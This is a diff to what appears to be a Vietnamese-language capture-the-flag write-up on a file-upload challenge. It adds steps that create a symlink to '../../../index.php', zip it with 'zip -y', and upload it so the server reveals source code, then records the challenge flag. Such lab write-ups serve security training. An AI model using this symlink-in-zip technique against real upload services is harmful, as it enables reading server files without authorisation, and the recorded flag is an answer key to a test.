@@ -132,8 +132,15 @@ Khi upload file zip thì server đổi tên file và giải nén file đó. File
 
 ![image](https://github.com/aQ05/Write-up.training/assets/121664384/7219587c-b252-4cc3-a280-2267537325ab)
 
-Tạo file `.txt`
+Tạo symlink đến file index.php cần đọc
 
+`$ ln -s ../../../index.php shell.txt`
+
+Sau đó nén file shell.txt vừa tạo lại
+
+`$ zip -y shell.zip shell.txt`
+
+![Screenshot 2023-11-25 232549](https://github.com/aQ05/Write-up.training/assets/121664384/537bc188-8acb-45a5-b936-1aed5ca2a640)
 
 > [symbolic / soft link](https://clammy-snowstorm-0d2.notion.site/symbolic-soft-link-05ca57bf671a42acae52cfba49f19cb5) được sử dụng để tạo lối tắt đến tệp hoặc thư mục, giúp chúng ta có thể truy cập được từ các vị trí khác nhau trong hệ thống tệp.
 >
@@ -145,6 +152,7 @@ Tạo file `.txt`
 
 ![image](https://github.com/aQ05/Write-up.training/assets/121664384/8f819beb-19d5-4335-b6c7-677d073d4596)
 
+## Flag
 `N3v3r_7rU5T_u5Er_1npU7`
 # File upload - Polyglot
 **Statement**
